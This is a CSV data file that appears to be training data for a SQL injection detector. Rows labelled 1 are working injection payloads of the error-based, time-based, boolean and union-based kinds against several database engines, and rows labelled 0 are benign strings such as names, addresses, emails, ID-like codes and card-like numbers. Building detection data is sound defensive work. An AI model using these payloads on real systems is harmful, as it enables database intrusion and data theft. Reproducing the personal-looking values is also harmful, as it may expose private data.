Sentence,Label
"1'  )  )   as jntr where 5051 = 5051 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
lizzi,0
"-8844""  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
" Among others , question raised embankments detention reservoirs longer planned protect location ",0
57,0
saetero farrer,0
dunn,0
calle benifallim 97 10?e,0
61089913g,0
braiam,0
6529215202550061,0
38993479s,0
1 )  as rqac where 3381 = 3381 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
reilly-pidgeon@interpretacion-diccionario-y-significado-de-los-s,0
" Prof Georgio Vallortigara , neuroscientist University Trento , said: &quot; It well known humans left right side brain differently involved stimuli invokes positive negative emotions ",0
rushmann@clubforex.jm,0
1' union all select null#,1
terri,0
guiomar,0
"1'  )  )   )  union all select null,null,null,null,null,null,null,null#",1
felisa,0
kuss@inoxled.jobs,0
"1 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1'+ ( select 'arzm' where 6464 = 6464 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   ) +'",1
" &quot; But ever since Edward Snowden , contractor turned whistleblower , began releasing treasure trove US surveillance secrets , European governments business leaders longer sure whether take director word ",0
"calle los tipografos, 98, 4g",0
lamentante,0
6749,0
"select * from generate_series ( 3267,3267,case when  ( 3267 = 5900 )  then 1 else 0 end )  limit 1--",1
vilaprio,0
"1 )  and elt ( 3138 = 1817,1817 ) ",1
14880,0
sempronia,0
carlo_salcedo4@nomao.wf,0
"-5317'  )  )   union all select 7673,7673,7673,7673,7673,7673#",1
fergus,0
1%' )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
mettrey,0
montan cigala,0
yebra de basa,0
"1"" and 7533 = 7533 and ""btak"" like ""btak",1
extinti3o,0
"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
"1'+ ( select 'tzyz' where 4912 = 4912 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
juana,0
6679885410766577,0
5525531016614315,0
1 )  where 6116 = 6116 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
rehenchida,0
agramontesa,0
"1' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
1' )  order by 1#,1
"1""  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"select sleep ( 5 )  and   (  (   ( ""%"" = """,1
"-4615'  )  )   )  or elt ( 1032 = 1032,3623 )  and   (  (   ( 'jipk' like 'jipk",1
tissot@twinjet.bs,0
perseidas,0
andee,0
calle ulises s/n 11d,0
"1%"" )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""%"" = """,1
06327548h,0
pozuelo de calatrava,0
"select count ( * )  from generate_series ( 1,5000000 )  and  ( ""%"" = """,1
"-5560""  )  )   or 7292 = 6184#",1
72935768p,0
wambsgan,0
furia@gallegonicolas.bf,0
"1 )  where 7600 = 7600 union all select null,null,null,null,null,null--",1
82444604t,0
09193,0
"1"" where 2642 = 2642 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"elt ( 5098 = 2728,1 ) ",1
